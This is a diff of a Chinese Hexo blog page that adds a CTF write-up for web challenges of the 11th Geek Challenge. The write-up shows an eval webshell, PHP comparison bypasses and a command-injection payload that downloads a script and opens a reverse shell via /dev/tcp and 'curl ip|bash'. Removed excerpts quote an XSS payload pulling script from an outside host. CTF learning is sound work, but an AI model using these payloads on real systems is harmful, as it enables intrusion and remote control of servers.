@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta name="renderer" content="webkit">
@@ -19,7 +17,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive: 2020 - 摸摸哒</title>
+  <title>摸摸哒</title>
   
 
   
@@ -331,7 +329,7 @@
   
     
     
-        <div class='cover-wrapper  dock' style="display: none;">
+        <div class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -423,14 +421,14 @@
  
 <script> 
   // 处理封面 此时 jquery 还没加载 
-  if ("half" == "none") { // 移除封面 
+  if ("none" == "none") { // 移除封面 
     document.getElementsByClassName('cover-wrapper')[0].style.display = "none"; 
     document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
   } else { 
-    if ("half" == "half") { // 半屏 
+    if ("none" == "half") { // 半屏 
       document.getElementsByClassName('cover-wrapper')[0].setAttribute('id', 'half'); 
       document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
-    } else if ("half" == "full") { // 全屏 
+    } else if ("none" == "full") { // 全屏 
       document.getElementsByClassName('cover-wrapper')[0].setAttribute('id', 'full'); 
       document.getElementsByClassName('scroll-down')[0].style.display = ""; 
     } 
@@ -444,326 +442,247 @@
         
 
 <div class='l_main'>
-	
-		
-  <section class="post-list">
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
     
+    
+    
+  </div>
+
+
+  
+  <h1 id="第十一届极客大挑战WEB的wp"><a href="#第十一届极客大挑战WEB的wp" class="headerlink" title="第十一届极客大挑战WEB的wp"></a>第十一届极客大挑战WEB的wp</h1><h5 id="1-EZwww"><a href="#1-EZwww" class="headerlink" title="1 EZwww"></a>1 EZwww</h5><p>备份是个“好🤺”习惯</p>
+<p>考点文件的备份</p>
+<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017104831185.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017104831185.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201017104831185" style="zoom: 33%;" />
+
+<p>网站有备份！</p>
+<p><strong>首先想到了  <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong></p>
+<p>果然有www文件看index.php内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Lola<span class="string">&#x27;s website1.0&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo &#x27;</span>&lt;h1&gt;welcome to my website&lt;/h1&gt;<span class="string">&#x27;; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo &#x27;</span>&lt;p&gt;i will never forget to backup my website......&lt;/p&gt;<span class="string">&#x27;; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo &#x27;</span>&lt;img src=<span class="string">&quot;img/lola.gif&quot;</span> alt=<span class="string">&quot;welcome~&quot;</span>/&gt;<span class="string">&#x27;; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$key1 = $_POST[&#x27;</span>a<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">$key2 = base64_decode(&#x27;</span>c3ljbDB2ZXI=<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">if($key1 === $key2)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    //this is a true flag</span></span><br><span class="line"><span class="string">echo &#x27;</span>&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h5 id="2朋友的学妹"><a href="#2朋友的学妹" class="headerlink" title="2朋友的学妹"></a>2朋友的学妹</h5><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017105211533.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017105211533.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201017105211533" style="zoom:50%;" />
+
+<p>base64解密即可</p>
+<h5 id="3Welcome"><a href="#3Welcome" class="headerlink" title="3Welcome"></a>3Welcome</h5><p>POST请求获取源码</p>
+<p>post提交参数得到shell</p>
+<p>查找.php</p>
+<p>找flag找不到！</p>
+<p>在bp抓包，</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017141940307.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017141940307.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201017141940307"></p>
+<h5 id="4git泄露"><a href="#4git泄露" class="headerlink" title="4git泄露"></a>4git泄露</h5><p>用工具跑，就可以出来了！</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017144031906.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201017144031906.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201017144031906"></p>
+<h5 id="5刘壮的黑页-代码审计"><a href="#5刘壮的黑页-代码审计" class="headerlink" title="5刘壮的黑页 代码审计"></a>5刘壮的黑页 代码审计</h5><p>拉到最下边</p>
+<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018150802684.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018150802684.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018150802684" style="zoom: 50%;" />
+
+<h5 id="6我是大黑客eval漏洞注入"><a href="#6我是大黑客eval漏洞注入" class="headerlink" title="6我是大黑客eval漏洞注入"></a>6我是大黑客eval漏洞注入</h5><p>漏洞种下了木马</p>
+<p>下载备份文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">&#x27;liuzhuang&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//谁是大恶人 那必定是我liuzhuang</span></span><br><span class="line"><span class="comment">//当你的服务器看到 0xliuzhuang 就知道要买台新机器了</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>eval漏洞注入（把输入的php代码执行了）</p>
+<p>print_r(scandir(‘./‘))     <strong>print_r 按数组输出 scandir(‘./‘)//当前目录</strong></p>
+<p>liuzhuang=print_r(scandir(‘../‘)) ;</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018160030459.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018160030459.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018160030459"></p>
+<p>liuzhuang=<strong>var_dump</strong>(file(‘../flag’)) ;<strong>输出变量和值</strong></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018160335690.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018160335690.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018160335690"></p>
+<p>我认为一般var_dump和file是连用的，这样方便，只用</p>
+<p><strong>不能只有file(‘../flag’)这样是不会输出的！</strong></p>
+<p>liuzhuang=<strong>show_source</strong>(‘../flag’);也可以<strong>输出源码</strong></p>
+<p>liuzhuang=print_r(file(‘../flag’));</p>
+<h5 id="7ezbypass"><a href="#7ezbypass" class="headerlink" title="7ezbypass"></a>7ezbypass</h5><p>c不能是数字,那就构造123adada；比较的时候只取数字部分！</p>
+<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018164409814.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201018164409814.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018164409814" style="zoom:50%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(0 &#x3D;&#x3D; &#39;0&#39;); &#x2F;&#x2F; true</span><br><span class="line">var_dump(0 &#x3D;&#x3D; &#39;abcdefg&#39;); &#x2F;&#x2F; true </span><br><span class="line">var_dump(0 &#x3D;&#x3D;&#x3D; &#39;abcdefg&#39;); &#x2F;&#x2F; false</span><br><span class="line">var_dump(1 &#x3D;&#x3D; &#39;1abcdef&#39;); &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>
+
+<p>SYC{php_4s_so_funny}</p>
+<h5 id="8知X堂的php教程"><a href="#8知X堂的php教程" class="headerlink" title="8知X堂的php教程"></a>8知X堂的php教程</h5><p>反弹shell</p>
+<p>简单点说就是，把bash脚本传到他的服务器上！再执行bash脚本！就获取他的shell了</p>
+<p>dirname= </p>
+<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201020193552420.png" class="lazyload" data-srcset="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201020193552420.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201020193552420" style="zoom:50%;" />
+
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname&#x3D;; ip&#x2F;1.txt -o &#x2F;tmp&#x2F;aaa</span><br></pre></td></tr></table></figure>
+
+<p><code>-o</code>参数将服务器的回应保存成文件，就是把我的服务器里的1.txt传到他的服务器里放到/tmp/aaa</p>
+<p>1.txt里是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh </span><br><span class="line"></span><br><span class="line">curl 1.1.1.1|bash </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">相当于：curl bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;7777(端口) 0&gt;&amp;1|bash </span><br></pre></td></tr></table></figure>
+
+<p><strong>ip</strong>里放的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;7777(端口) 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777监听一下</span><br></pre></td></tr></table></figure>
+
+<p>/tmp/aaa里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh </span><br><span class="line">curl bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;7777(端口) 0&gt;&amp;1|bash </span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname&#x3D;; .&#x2F;tmp&#x2F;aaa  或  bash &#x2F;tmp&#x2F;aaa</span><br></pre></td></tr></table></figure>
+
+<p>bash -i &gt;&amp;/dev/tcp/ip/7777(端口) 0&gt;&amp;1</p>
+<p>反弹shell的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh </span><br><span class="line"></span><br><span class="line">curl 1.1.1.1|bash </span><br></pre></td></tr></table></figure>
+
+<p>curl ip|bash   给这个ip服务器shell权限</p>
+<p>curl  访问源码<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+<p><strong>常见的反弹shell：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;ls $search_dir&quot;, $contents);</span><br></pre></td></tr></table></figure>
+
+<p>exec</p>
+<p>system 函数都有命令执行！</p>
+<h5 id="9"><a href="#9" class="headerlink" title="9"></a>9</h5>
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/>http://example.com/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-20T19:58:06+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Oct 20, 2020</p>
+  </a>
+</div>
+
+        
       
         
           
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
+
         
       
-    
-    
-      
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-        Oct 21, 2020
-      </a>
-    </h2>
-  
-  <div class='md'>
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        文件上传
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title= - 摸摸哒&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title= - 摸摸哒&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title= - 摸摸哒&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i></p>
+          <p class='content'>文件上传
 upload-labs:
 文件上传出题绕过代码：
-1234$file_name = deldot($file_name);//删除文件名末尾的点       $file_ext = strrchr($file_name, &#x27;.&#x27;);       $file_ext = strtolower($file_ext); //转换为小写       $file_ext ...
+1234$file_name = deldot($file_name);//删除文件名末尾的点       $file_ext = s...</p>
+        </a>
       
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-10-21</time>
-        
-      </div>
       
-        <div>
-          <a class='readmore' href='/2020/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
-        Oct 21, 2020
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        第十一届极客大挑战WEB的wp1 EZwww备份是个“好🤺”习惯
-考点文件的备份
-
-
-网站有备份！
-首先想到了  www.zip
-果然有www文件看index.php内容
-123456789101112131415161718192021&lt;html&gt; &lt;head&gt;  &lt;title&gt;Lola&#x27;s website1.0&lt;/title&gt; ...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-10-21</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/21/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/10/21/New%20Bugku/">
-        Oct 21, 2020
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        New Bugku
+        <a class='next' href='/2020/10/21/New%20Bugku/'>
+          <p class='title'><i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>New Bugku
 1extract()函数变量覆盖用途：从数组中将变量导入到当前的符号表，返回值(int型)是成功导入到符号表中的变量数目
 什么是符号表？
-符号表是指当前php页面中，所有变量名称的集合
-1此时$a=’’(空字符串),而不是NULL,flag只需传除存在的文件名以外任意值,空字符串弱等于FALSE,输出flag
-
-2 web 2 拼手速 py1234567891011121...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-10-21</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/21/New%20Bugku/'>
-            Read More
-          </a>
-        </div>
+符号表是指当前php页面中，所有变量...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/10/21/ctfhub/">
-        Oct 21, 2020
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        CtfHub1 Xss反射型
-1&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;https:&#x2F;&#x2F;xss8.cc&#x2F;bb4A&gt;&lt;&#x2F;sCrIpT&gt;
-
-https://blog.csdn.net/solitudi/article/details/107544165
-2 CTFH...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-10-21</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/21/ctfhub/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/09/30/9-28/">
-        Sep 30, 2020
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        常见漏洞sql注入联合查询sqli-labs less-1
-
-判断后台sql语句闭合方式
-
-order by判断列数
-
-判断回显位
-
-注数据
+  </article>
 
 
-1234&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;&#39;1&#39;&#39; LIMIT 0,1select * from users where id&#x3D;&#39;$id&#39; LIMIT 0,1s...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-09-30</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/09/30/9-28/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/09/30/hello-world/">
-        Hello World
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Qu...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-09-30</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/09/30/hello-world/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
 
 
-	
+
+
 </div>
 <aside class='l_side'>
   
@@ -771,89 +690,28 @@ Qu...
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1603275173436&di=6c9d37cd2c59acb53bbf0a1058475c9e&imgtype=0&src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201708%2F04%2F20170804153859_vzrEG.jpeg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>贪吃鱼</h2>
-        
-        
-        
-          <p><span id="jinrishici-sentence">摸摸哒</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
+  <header>
     
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
 
-  
 
-  
-    
-    
+    <div class='content'>
